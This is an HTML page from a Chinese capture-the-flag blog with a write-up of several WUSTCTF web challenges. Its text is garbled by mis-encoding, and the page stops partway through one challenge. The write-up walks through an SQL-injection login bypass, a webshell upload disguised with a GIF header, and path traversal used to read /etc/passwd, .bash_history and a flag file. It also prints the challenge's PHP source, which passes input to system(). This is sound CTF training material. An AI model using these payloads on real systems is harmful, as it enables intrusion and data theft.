<!DOCTYPE html>
<html>
<head hexo-theme='https://volantis.js.org/#@byc_404'>
  <meta charset="utf-8">
  <!-- SEOç›¸å…³ -->
  
    
  
  <!-- æ¸²æŸ“ä¼˜åŒ– -->
  <meta name="renderer" content="webkit">
  <meta name="force-rendering" content="webkit">
  <meta http-equiv="X-UA-Compatible" content="IE=Edge,chrome=1">
  <meta name="HandheldFriendly" content="True" >
  <meta name="apple-mobile-web-app-capable" content="yes">
  <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1">

  <!-- é¡µé¢å…ƒæ•°æ® -->
  
    <title>WUSTCTF&amp;MRCTFéƒ¨åˆ†webé¢˜è§£ - byc_404&#39;s blog</title>
  
    <meta name="keywords" content="CTF,WEB,wp">
  
  
    <meta name="description" content="è¿™å‘¨æœ«é¡ºæ‰‹æ‰“äº†ä¸‹ä¸¤ä¸ªæ–°ç”Ÿèµ›ã€‚æœ¬æ¥ä¸æƒ³å†™wpçš„,ä½†æ˜¯æƒ³åˆ°ä¸Šå‘¨BJDæ¯”èµ›çš„wpä¹Ÿæ²¡å†™å°±æƒ³ç€è¿˜æ˜¯è¡¥ç€å§ã€‚ï¼ˆä¸Šå‘¨BJDä¸å†™æ˜¯å› ä¸ºå¯¹æ¯”èµ›é¢˜ç›®å¿ƒé‡Œæœ‰æ„è§ï¼Œè¯´æ˜¯æ–°ç”Ÿèµ›ï¼Œè„‘æ´è·Ÿå¥—å¨ƒé¢˜æŠŠä¸€å †è€æ‰‹éƒ½æ•´å¾—ä¸èˆ’æœã€‚å½“æ—¶å·®ä¸€é“ASP.NET,å› ä¸ºysoserialçš„gadgetç”¨çš„ä¸å¯¹å°±ä¸€ç›´å‡ºä¸äº†ç»“æœï¼Œç›´æ¥å¿ƒæ€æå´©ï¼‰æ‰€ä»¥è¿™æ¬¡æŠŠè¿™ä¸¤ä¸ªæ–°ç”Ÿèµ›...">
  

  <!-- feed -->
  
    <link rel="alternate" href="/atom.xml" title="byc_404's blog">
  

  <!-- import meta -->
  

  <!-- link -->
  <link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/@fortawesome/fontawesome-free@5.13/css/all.min.css">
  
    
<link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/@fancyapps/fancybox@3.5.7/dist/jquery.fancybox.min.css">

  
  
    
<link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/node-waves@0.7.6/dist/waves.min.css">

  

  
  <link rel="shortcut icon" type='image/x-icon' href="/assests/favicon.ico">
  

  

  

  <!-- import link -->
  

  
  
    
<link rel="stylesheet" href="https://cdn.jsdelivr.net/gh/xaoxuu/cdn-volantis@2.6.5/css/style.css">

  

  <script>
    function setLoadingBarProgress(num) {
      document.getElementById('loading-bar').style.width=num+"%";
    }
  </script>

  
  
</head>

<body>
  
  <div class="cover-wrapper">
    
      <cover class='cover post half'>
        <div class='cover-body'>
  <div class='a'>
    
    
      <p class="title">byc_404's blog</p>
    
    
      <p class="subtitle">Do not go gentle into that good night</p>
    
  </div>
  <div class='b'>
    
      <div class="m_search">
        <form name="searchform" class="form u-search-form">
          <input type="text" class="input u-search-input" placeholder="" />
          <i class="icon fas fa-search fa-fw"></i>
        </form>
      </div>
    
    <div class='menu navigation'>
      <ul class='cover-list-h'>
        
      </ul>
    </div>
  </div>
</div>

      </cover>
    
    <div id="loading-bar-wrapper">
  <div id="loading-bar"></div>
</div>
<header class="l_header shadow blur">
  <div class='container'>
  <div class='wrapper'>
    <div class='nav-sub'>
      <p class="title"></p>
      <ul class='switcher nav-list-h'>
        <li><a class="s-comment fas fa-comments fa-fw" target="_self" href='javascript:void(0)'></a></li>
        
          <li><a class="s-toc fas fa-list fa-fw" target="_self" href='javascript:void(0)'></a></li>
        
      </ul>
    </div>
		<div class="nav-main">
      
        
        <a class="title flat-box" target="_self" href='/'>
          
          
          
          
            IGNITE <b><sup style='color:#3AA757'>@byc_404</sup></b>
          
        </a>
      

			<div class='menu navigation'>
				<ul class='nav-list-h'>
          
          
          
            
            
              <li>
                <a class="flat-box" href=/
                  
                  
                  
                    id="home"
                  >
                  <i class='fas fa-rss fa-fw'></i>åšå®¢
                </a>
                
              </li>
            
          
          
            
            
              <li>
                <a class="flat-box" href=/categories/
                  
                  
                  
                    id="categories"
                  >
                  <i class='fas fa-folder-open fa-fw'></i>åˆ†ç±»
                </a>
                
              </li>
            
          
          
            
            
              <li>
                <a class="flat-box" href=/tags/
                  
                  
                  
                    id="tags"
                  >
                  <i class='fas fa-tags fa-fw'></i>æ ‡ç­¾
                </a>
                
              </li>
            
          
          
            
            
              <li>
                <a class="flat-box" href=/archives/
                  
                  
                  
                    id="archives"
                  >
                  <i class='fas fa-archive fa-fw'></i>å½’æ¡£
                </a>
                
              </li>
            
          
          
            
            
              <li>
                <a class="flat-box" href=/friends/
                  
                  
                  
                    id="friends"
                  >
                  <i class='fas fa-link fa-fw'></i>å‹é“¾
                </a>
                
              </li>
            
          
          
            
            
              <li>
                <a class="flat-box" href=/about/
                  
                  
                  
                    id="about"
                  >
                  <i class='fas fa-info-circle fa-fw'></i>å…³äº
                </a>
                
              </li>
            
          
          
				</ul>
			</div>

      <div class="m_search">
        <form name="searchform" class="form u-search-form">
          <i class="icon fas fa-search fa-fw"></i>
          <input type="text" class="input u-search-input" placeholder="Search..." />
        </form>
      </div>

			<ul class='switcher nav-list-h'>
				
					<li><a class="s-search fas fa-search fa-fw" target="_self" href='javascript:void(0)'></a></li>
				
				<li>
          <a class="s-menu fas fa-bars fa-fw" target="_self" href='javascript:void(0)'></a>
          <ul class="menu-phone list-v navigation white-box">
            
              
            
              <li>
                <a class="flat-box" href=/
                  
                  
                  
                    id="home"
                  >
                  <i class='fas fa-rss fa-fw'></i>åšå®¢
                </a>
                
              </li>
            
          
            
              
            
              <li>
                <a class="flat-box" href=/categories/
                  
                  
                  
                    id="categories"
                  >
                  <i class='fas fa-folder-open fa-fw'></i>åˆ†ç±»
                </a>
                
              </li>
            
          
            
              
            
              <li>
                <a class="flat-box" href=/tags/
                  
                  
                  
                    id="tags"
                  >
                  <i class='fas fa-tags fa-fw'></i>æ ‡ç­¾
                </a>
                
              </li>
            
          
            
              
            
              <li>
                <a class="flat-box" href=/archives/
                  
                  
                  
                    id="archives"
                  >
                  <i class='fas fa-archive fa-fw'></i>å½’æ¡£
                </a>
                
              </li>
            
          
            
              
            
              <li>
                <a class="flat-box" href=/friends/
                  
                  
                  
                    id="friends"
                  >
                  <i class='fas fa-link fa-fw'></i>å‹é“¾
                </a>
                
              </li>
            
          
            
              
            
              <li>
                <a class="flat-box" href=/about/
                  
                  
                  
                    id="about"
                  >
                  <i class='fas fa-info-circle fa-fw'></i>å…³äº
                </a>
                
              </li>
            
          
            
          </ul>
        </li>
			</ul>
		</div>
	</div>
  </div>
</header>

<script>setLoadingBarProgress(40);</script>

  </div>


  <div class="l_body">
    <div class='body-wrapper'>
      

<div class='l_main'>
  

  
    <article id="post" class="post white-box reveal shadow article-type-post" itemscope itemprop="blogPost">
      


  <section class='meta'>
    
      
      
      <div class="meta" id="header-meta">
        
          
  <h1 class="title">
    <a href="/2020/03/29/WUSTCTF&MRCTF%E9%83%A8%E5%88%86web%E9%A2%98%E8%A7%A3/">
      WUSTCTF&MRCTFéƒ¨åˆ†webé¢˜è§£
    </a>
  </h1>


        
        <div class='new-meta-box'>
          
            
          
            
              
<div class='new-meta-item author'>
  <a href="https://www.bycsec.top" rel="nofollow">
    <img src="/assests/favicon.ico">
    <p>byc_404</p>
  </a>
</div>

            
          
            
              

            
          
            
              <div class="new-meta-item date">
  <a class='notlink'>
    <i class="fas fa-calendar-alt fa-fw" aria-hidden="true"></i>
    <p>å‘å¸ƒäºï¼šMar 29, 2020</p>
  </a>
</div>

            
          
            
          
        </div>
        
          <hr>
        
      </div>
    
  </section>


      <section class="article typo">
        <div class="article-entry" itemprop="articleBody">
          
          <p>è¿™å‘¨æœ«é¡ºæ‰‹æ‰“äº†ä¸‹ä¸¤ä¸ªæ–°ç”Ÿèµ›ã€‚æœ¬æ¥ä¸æƒ³å†™wpçš„,ä½†æ˜¯æƒ³åˆ°ä¸Šå‘¨BJDæ¯”èµ›çš„wpä¹Ÿæ²¡å†™å°±æƒ³ç€è¿˜æ˜¯è¡¥ç€å§ã€‚ï¼ˆä¸Šå‘¨BJDä¸å†™æ˜¯å› ä¸ºå¯¹æ¯”èµ›é¢˜ç›®å¿ƒé‡Œæœ‰æ„è§ï¼Œè¯´æ˜¯æ–°ç”Ÿèµ›ï¼Œè„‘æ´è·Ÿå¥—å¨ƒé¢˜æŠŠä¸€å †è€æ‰‹éƒ½æ•´å¾—ä¸èˆ’æœã€‚å½“æ—¶å·®ä¸€é“ASP.NET,å› ä¸ºysoserialçš„gadgetç”¨çš„ä¸å¯¹å°±ä¸€ç›´å‡ºä¸äº†ç»“æœï¼Œç›´æ¥å¿ƒæ€æå´©ï¼‰æ‰€ä»¥è¿™æ¬¡æŠŠè¿™ä¸¤ä¸ªæ–°ç”Ÿèµ›é¢˜ç›®å†™å†™ã€‚å…·ä½“åªå¤§è‡´è®²ä¸‹æ€è·¯å§</p>
<a id="more"></a>


<h1 id="WUSTCTF"><a href="#WUSTCTF" class="headerlink" title="WUSTCTF"></a>WUSTCTF</h1><p>å¾ˆæœ‰æ„æ€ï¼Œé¢˜ç›®é‡Œphpéš¾åº¦éƒ½æ¯”è¾ƒåŸºç¡€ã€‚javaéš¾åº¦å°±ä¸ä¸€æ ·äº†ï¼Œä¼°è®¡æ˜¯javaæ¥è§¦çš„å°‘çš„åŸå› å§ã€‚</p>
<h2 id="checkin"><a href="#checkin" class="headerlink" title="checkin"></a>checkin</h2><p>è¿›å»ä¸€ä¸ªå‰ç«¯éªŒè¯ã€‚é™åˆ¶æŒ‰é’®è·Ÿé•¿åº¦ã€‚å‰ç«¯æŠŠæŒ‰é’®è§£å†³åæŠ“ä¸ªåŒ…ä¼ å‡ºé¢˜äººåå­—å°±å¥½ï¼Œå¾—åˆ°å‡ºé¢˜äººblog<br>(è€å®è¯´æ¶æ„å¼•æµä¸å¥½å§â€¦â€¦)<br>å¯ä»¥åœ¨åšå®¢å‰ç«¯çœ‹åˆ°éƒ¨åˆ†flagï¼Œä½†æ˜¯åªæœ‰ä¸€åŠï¼Œåä¸€åŠé€šè¿‡åšå®¢é“¾æ¥åˆ°githubå»,å¯ä»¥æ‰¾åˆ°ååŠéƒ¨åˆ†</p>
<h2 id="admin"><a href="#admin" class="headerlink" title="admin"></a>admin</h2><p>å¼€å§‹éšæ‰‹ä¸€ä¸ªä¸‡èƒ½å¯†ç <code>admin&#39; or 1=1#</code>å°±è¿›å»äº†ã€‚<br><code>/adddddddddddddddddddddddminnnnnnnnnnnnnnnnnnnnnn.php</code><br>ç„¶åå°±æ˜¯æ”¹headerä»¥åŠgetï¼Œpostå€¼å³å¯<br>å¾—åˆ°paste.ubuntuåˆ†æ®µç»™å‡ºçš„ç½‘é¡µé“¾æ¥ï¼Œæ‰¾åˆ°æ­£ç¡®çš„å³å¯å¾—åˆ°ç¼–ç åçš„flagã€‚è§£ç å³å¯</p>
<h2 id="CV-Maker"><a href="#CV-Maker" class="headerlink" title="CV Maker"></a>CV Maker</h2><p>åŸºç¡€ä¸Šä¼ ,ç™»å½•æ³¨å†Œåå…ˆä¸Šä¼ ä¸€ä¸ªphp,æŠ¥çš„æ˜¯exif_imagetype()æ£€æŸ¥ã€‚é‚£å°±åªè¦æ–‡ä»¶å¤´è§£å†³å°±å¥½äº†ï¼Œä¼ ä¸€ä¸ªé©¬<br>,å‰é¢åŠ ä¸ŠGIF89Aå³å¯ã€‚<br>(è¿™é‡Œè¿˜æœ‰uploadsçš„ç›®å½•éå†,éšä¾¿ä¸€ä¸ªéƒ½æ˜¯ç°æˆçš„å‚è€ƒæ¡ˆä¾‹)<br>èšå‰‘è¿æ¥åæ ¹ç›®å½•<code>/readflag</code>å³å¯ã€‚</p>
<h2 id="easyweb"><a href="#easyweb" class="headerlink" title="easyweb"></a>easyweb</h2><p>è¿™é¢˜æ˜¯é“javaé¢˜ã€‚æˆ‘ç”¨éé¢„æœŸåšå‡ºæ¥çš„ã€‚æ¯•ç«Ÿè‡ªå·±javaçŸ¥è¯†æœ‰é™â€¦â€¦</p>
<p>é¦–å…ˆè¿›å»åˆæ˜¯ä¸ªä¸Šä¼ ï¼Œä¼ ä¸€ä¸ªæ–‡ä»¶ä¸Šå»çœ‹åˆ°çˆ†å‡ºä¸€ä¸ªdownloadè·¯ç”±ä¸fileå‚æ•°<br><img src="/2020/03/29/WUSTCTF&MRCTF%E9%83%A8%E5%88%86web%E9%A2%98%E8%A7%A3/0.PNG" alt><br>é‚£å°±æœ‰ä»»æ„æ–‡ä»¶ä¸‹è½½<br>javaé¢˜å¿…è¯»çš„å‡ ä¸ªé…ç½®æ–‡ä»¶,é¦–å…ˆå°±æ˜¯WEB-INFä¸‹çš„web.xml</p>
<figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line">    <span class="tag">&lt;<span class="name">context-param</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">param-name</span>&gt;</span>webAppRootKey<span class="tag">&lt;/<span class="name">param-name</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">param-value</span>&gt;</span>tomcat.ajp<span class="tag">&lt;/<span class="name">param-value</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">context-param</span>&gt;</span></span><br><span class="line"></span><br><span class="line">    <span class="tag">&lt;<span class="name">listener</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">listener-class</span>&gt;</span></span><br><span class="line">            org.springframework.web.util.WebAppRootListener</span><br><span class="line">        <span class="tag">&lt;/<span class="name">listener-class</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">listener</span>&gt;</span></span><br><span class="line"></span><br><span class="line">    <span class="tag">&lt;<span class="name">welcome-file-list</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">welcome-file</span>&gt;</span>/WEB-INF/views/index.jsp<span class="tag">&lt;/<span class="name">welcome-file</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">welcome-file-list</span>&gt;</span></span><br><span class="line"></span><br><span class="line">    <span class="tag">&lt;<span class="name">error-page</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">exception-type</span>&gt;</span>java.lang.Throwable<span class="tag">&lt;/<span class="name">exception-type</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">location</span>&gt;</span>/error<span class="tag">&lt;/<span class="name">location</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">error-page</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">web-app</span>&gt;</span></span><br></pre></td></tr></table></figure>
<p>åªæœ‰ä¸€ä¸ªindex.jsp,åŒæ ·ä¸‹è½½åå‘ç°æ²¡ä»€ä¹ˆå†…å®¹ã€‚<br>è¿™æ—¶å¼€å§‹å°è¯•è¯»å–å…¶ä»–æ–‡ä»¶ï¼Œæ„é€ åå‘ç°å¯ä»¥è¯»å–åˆ°/etc/passwd</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line">root:x:0:0:root:/root:/bin/bash</span><br><span class="line">daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin</span><br><span class="line">bin:x:2:2:bin:/bin:/usr/sbin/nologin</span><br><span class="line">sys:x:3:3:sys:/dev:/usr/sbin/nologin</span><br><span class="line">sync:x:4:65534:sync:/bin:/bin/sync</span><br><span class="line">games:x:5:60:games:/usr/games:/usr/sbin/nologin</span><br><span class="line">man:x:6:12:man:/var/cache/man:/usr/sbin/nologin</span><br><span class="line">lp:x:7:7:lp:/var/spool/lpd:/usr/sbin/nologin</span><br><span class="line">mail:x:8:8:mail:/var/mail:/usr/sbin/nologin</span><br><span class="line">news:x:9:9:news:/var/spool/news:/usr/sbin/nologin</span><br><span class="line">uucp:x:10:10:uucp:/var/spool/uucp:/usr/sbin/nologin</span><br><span class="line">proxy:x:13:13:proxy:/bin:/usr/sbin/nologin</span><br><span class="line">www-data:x:33:33:www-data:/var/www:/usr/sbin/nologin</span><br><span class="line">backup:x:34:34:backup:/var/backups:/usr/sbin/nologin</span><br><span class="line">list:x:38:38:Mailing List Manager:/var/list:/usr/sbin/nologin</span><br><span class="line">irc:x:39:39:ircd:/var/run/ircd:/usr/sbin/nologin</span><br><span class="line">gnats:x:41:41:Gnats Bug-Reporting System (admin):/var/lib/gnats:/usr/sbin/nologin</span><br><span class="line">nobody:x:65534:65534:nobody:/nonexistent:/usr/sbin/nologin</span><br><span class="line">_apt:x:100:65534::/nonexistent:/bin/<span class="literal">false</span></span><br><span class="line">messagebus:x:101:102::/var/run/dbus:/bin/<span class="literal">false</span></span><br><span class="line">sshd:x:102:65534::/run/sshd:/usr/sbin/nologin</span><br><span class="line">systemd-timesync:x:103:104:systemd Time Synchronization,,,:/run/systemd:/bin/<span class="literal">false</span></span><br><span class="line">systemd-network:x:104:105:systemd Network Management,,,:/run/systemd/netif:/bin/<span class="literal">false</span></span><br><span class="line">systemd-resolve:x:105:106:systemd Resolver,,,:/run/systemd/resolve:/bin/<span class="literal">false</span></span><br><span class="line">systemd-bus-proxy:x:106:107:systemd Bus Proxy,,,:/run/systemd:/bin/<span class="literal">false</span></span><br><span class="line">tomajp:x:1000:1000::/home/tomajp:/bin/bash</span><br></pre></td></tr></table></figure>
<p>æœ‰æ„æ€çš„æ˜¯,æˆ‘ä»¬é¢˜ç›®èµ·çš„tomajpç”¨æˆ·çš„å®¶ç›®å½•æ˜¯ bin/bash.è¿™ç‚¹è®©æˆ‘æƒ³èµ·äº†ä¹‹å‰åšç½‘é¼æ¯Commentè¿™é“é¢˜çš„ä¸€ä¸ªæ”¶è·ï¼š<br>äºŒæ¬¡æ³¨å…¥,æ•°æ®åº“å´æ²¡æœ‰flag,é€šè¿‡è¯»å–.bash_historyå‘ç°äº†å…¶ä»–æ–‡ä»¶å¤¹ä¸­æœªåˆ é™¤çš„flagä»è€Œè¯»å–ã€‚<br>é‚£ä¹ˆæœ¬é¢˜å°è¯•è¯»å–<code>/home/tomajp/.bash_history</code><br><img src="/2020/03/29/WUSTCTF&MRCTF%E9%83%A8%E5%88%86web%E9%A2%98%E8%A7%A3/1.PNG" alt><br>å‘ç°æœ‰è¹Šè··ï¼Œæ‹–åˆ°ä¸‹é¢æœ‰å‘ç°<br><img src="/2020/03/29/WUSTCTF&MRCTF%E9%83%A8%E5%88%86web%E9%A2%98%E8%A7%A3/2.PNG" alt><br>æ ¹æ®è¿™é‡Œè®°å½•çš„æ“ä½œå¯ä»¥çœ‹åˆ°ï¼Œflagåº”è¯¥æ˜¯åœ¨æ ¹ç›®å½•çš„flaaaagæ–‡ä»¶å¤¹ä¸‹çš„what_you_want<br>ç›´æ¥è¯»å–å³å¯<br><code>/download?file=../../../../../../../../../flaaaag/what_you_want</code><br><img src="/2020/03/29/WUSTCTF&MRCTF%E9%83%A8%E5%88%86web%E9%A2%98%E8%A7%A3/3.PNG" alt></p>
<p>é—®äº†ä¸‹å®˜æ–¹,çš„ç¡®æ˜¯ä¸ªæ¯”è¾ƒç®€å•çš„éé¢„æœŸ,é¢„æœŸè§£æ˜¯ä¸Šä¼ jspè¿›è¡ŒRCE.ä½†æ˜¯æˆ‘ä¸€ç›´æ²¡å¼„æ˜ç™½tomcaté‡Œä¸Šä¼ ç›®å½•è¦æ€ä¹ˆè®¿é—®ï¼Œè¿™ä¸ªå¯èƒ½æ˜¯åƒäº†ä¸ç†Ÿæ‚‰javaweb<br>çš„é”…ã€‚ä¸è¯´äº†ï¼Œä¹‹å‰è¯´å¥½è¦å­¦javawebä¹Ÿå¾—æä¸Šæ—¥ç¨‹äº†ã€‚<br>ps:èµ›åäº†è§£åˆ°æ˜¯ghostcatæ‰“ã€‚è¿™ä¸ªå°±å¾ˆæœ‰è¶£äº†ï¼Œå› ä¸ºåŒæœŸçš„å¦ä¸€ä¸ªå›½é™…èµ›æœ‰é¢˜ä¹Ÿæ˜¯è¿™ä¸ªå¹½çµçŒ«ã€‚æ‰¾æ—¶é—´ç­‰buuä¸Šé¶æœºäº†å¤ç°ä¸‹è¿™ä¸ªæ´ã€‚<br>ä¸ç”¨ç­‰äº†ï¼Œç›´æ¥çœ‹æˆ‘ä¸‹ä¸€ç¯‡æ–‡ç« å³å¯ã€‚åšä¸€ä¸ªè„šæœ¬å°å­ï¼Œghostcatåˆ©ç”¨è¿˜æ˜¯ä¸éš¾çš„ã€‚</p>
<h2 id="æœ´å®æ— å"><a href="#æœ´å®æ— å" class="headerlink" title="æœ´å®æ— å"></a>æœ´å®æ— å</h2><p>å…ˆæ”¾ä¸€ä¸ªæ²¡æ‹¿åˆ°ä¸€è¡€çš„åŸå› <br><img src="/2020/03/29/WUSTCTF&MRCTF%E9%83%A8%E5%88%86web%E9%A2%98%E8%A7%A3/4.PNG" alt><br>æ‰‹æ…¢ä¸€æ­¥åŠ ä¸Šå‡ºé¢˜äººæƒé™æ²¡æ§å¥½,ç›´æ¥flagè¢«åˆ äº†ã€‚å¯¼è‡´æˆ‘å¤šèŠ±äº†åŠä¸ªå°æ—¶,æ‰¾å‡ºé¢˜äººæ²Ÿé€šåå¥½äº†ã€‚ä¸è¿‡è¯´åˆ°åº•æ…¢ä¸€æ­¥flagè¢«åˆ è¿˜æ˜¯å› ä¸ºåªæœ‰äºŒè¡€çš„æ‰‹é€Ÿâ€¦â€¦</p>
<p>é¦–å…ˆæ˜¯ä¿¡æ¯æ”¶é›†ï¼Œè¿™é‡Œå¥‡æ€ªçš„ä¸€ç‚¹æ˜¯<code>/.git/</code>ç›®å½•ç›´æ¥æš´éœ²åœ¨å¤–äº†,ä½†æ˜¯ä»”ç»†è§‚å¯Ÿä¸‹å‘ç°åªæ˜¯ä¸ªlampçš„git.ä¸çŸ¥é“æ˜¯ä¸æ˜¯ä¸ºäº†æ··æ·†è§†å¬æ•…æ„æ”¾çš„ã€‚åæ­£æˆ‘æ˜¯githackç”¨äº†å‡ æ¬¡æ‰å¯Ÿè§‰ä¸å¯¹åŠ²çš„ã€‚</p>
<p>ä¸ªäººä¿¡æ¯æ”¶é›†ä¸€ç›´æ˜¯æ‰‹æµ‹,æµ‹äº†å¥½å¤šæºç æ³„éœ²æ²¡ååº”åæ³¨æ„åˆ°index.phpç½‘é¡µçš„æ ‡é¢˜ä¸ºbotã€‚äºæ˜¯è€ƒè™‘robots.txtï¼Œå‘ç°äº†<code>fAke_f1agggg.php</code><br>è®¿é—®åå½“ç„¶æ²¡æœ‰çœŸflagï¼Œä½†æ˜¯headeré‡Œæœ‰<code>fl4g.php</code>ï¼Œå¾—åˆ°é¢˜ç›®æºç </p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">header(<span class="string">'Content-type:text/html;charset=utf-8'</span>);</span><br><span class="line">error_reporting(<span class="number">0</span>);</span><br><span class="line">highlight_file(<span class="keyword">__file__</span>);</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment">//level 1</span></span><br><span class="line"><span class="keyword">if</span> (<span class="keyword">isset</span>($_GET[<span class="string">'num'</span>]))&#123;</span><br><span class="line">    $num = $_GET[<span class="string">'num'</span>];</span><br><span class="line">    <span class="keyword">if</span>(intval($num) &lt; <span class="number">2020</span> &amp;&amp; intval($num + <span class="number">1</span>) &gt; <span class="number">2021</span>)&#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">"æˆ‘ä¸ç»æ„é—´çœ‹äº†çœ‹æˆ‘çš„åŠ³åŠ›å£«, ä¸æ˜¯æƒ³çœ‹æ—¶é—´, åªæ˜¯æƒ³ä¸ç»æ„é—´, è®©ä½ çŸ¥é“æˆ‘è¿‡å¾—æ¯”ä½ å¥½.&lt;/br&gt;"</span>;</span><br><span class="line">    &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">        <span class="keyword">die</span>(<span class="string">"é‡‘é’±è§£å†³ä¸äº†ç©·äººçš„æœ¬è´¨é—®é¢˜"</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;<span class="keyword">else</span>&#123;</span><br><span class="line">    <span class="keyword">die</span>(<span class="string">"å»éæ´²å§"</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">//level 2</span></span><br><span class="line"><span class="keyword">if</span> (<span class="keyword">isset</span>($_GET[<span class="string">'md5'</span>]))&#123;</span><br><span class="line">   $md5=$_GET[<span class="string">'md5'</span>];</span><br><span class="line">   <span class="keyword">if</span> ($md5==md5($md5))</span><br><span class="line">       <span class="keyword">echo</span> <span class="string">"æƒ³åˆ°è¿™ä¸ªCTFeræ‹¿åˆ°flagå, æ„Ÿæ¿€æ¶•é›¶, è·‘å»ä¸œæ¾œå²¸, æ‰¾ä¸€å®¶é¤å…, æŠŠå¨å¸ˆè½°å‡ºå», è‡ªå·±ç‚’ä¸¤ä¸ªæ‹¿æ‰‹å°èœ, å€’ä¸€æ¯æ•£è£…ç™½é…’, è‡´å¯Œæœ‰é“, åˆ«å­¦å°æš´.&lt;/br&gt;"</span>;</span><br><span class="line">   <span class="keyword">else</span></span><br><span class="line">       <span class="keyword">die</span>(<span class="string">"æˆ‘èµ¶ç´§å–Šæ¥æˆ‘çš„é…’è‚‰æœ‹å‹, ä»–æ‰“äº†ä¸ªç”µè¯, æŠŠä»–ä¸€å®¶å®‰æ’åˆ°äº†éæ´²"</span>);</span><br><span class="line">&#125;<span class="keyword">else</span>&#123;</span><br><span class="line">    <span class="keyword">die</span>(<span class="string">"å»éæ´²å§"</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">//get flag</span></span><br><span class="line"><span class="keyword">if</span> (<span class="keyword">isset</span>($_GET[<span class="string">'get_flag'</span>]))&#123;</span><br><span class="line">    $get_flag = $_GET[<span class="string">'get_flag'</span>];</span><br><span class="line">    <span class="keyword">if</span>(!strstr($get_flag,<span class="string">" "</span>))&#123;</span><br><span class="line">        $get_flag = str_ireplace(<span class="string">"cat"</span>, <span class="string">"wctf2020"</span>, $get_flag);</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">"æƒ³åˆ°è¿™é‡Œ, æˆ‘å……å®è€Œæ¬£æ…°, æœ‰é’±äººçš„å¿«ä¹å¾€å¾€å°±æ˜¯è¿™ä¹ˆçš„æœ´å®æ— å, ä¸”æ¯ç‡¥.&lt;/br&gt;"</span>;</span><br><span class="line">        system($get_flag);</span><br><span class="line">    &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">        <span class="keyword">die</span>(<span class="string">"å¿«åˆ°éæ´²äº†"</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;<span class="keyword">else</span>&#123;</span><br><span class="line">    <span class="keyword">die</span>(<span class="string">"å»éæ´²å§"</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
<p>è€å¥—å¨ƒäº†ã€‚<br>ç¬¬ä¸€å±‚ä¸€ä¸ªintvalçš„é—®é¢˜ã€‚<br>è¿™é‡Œä½¿ç”¨çš„æ˜¯ä¸€ä¸ªè¿›åˆ¶çš„æŠ€å·§ï¼Œæ¯”å¦‚2020çš„16è¿›åˆ¶7e4<br>intvalä¼šå°†å­—ç¬¦ä¸²7e4è®¤ä½œ7,è€Œintval(â€œ7e4â€+1)åˆ™è¢«ç±»å‹è½¬æ¢ï¼Œå˜ä¸º70001</p>
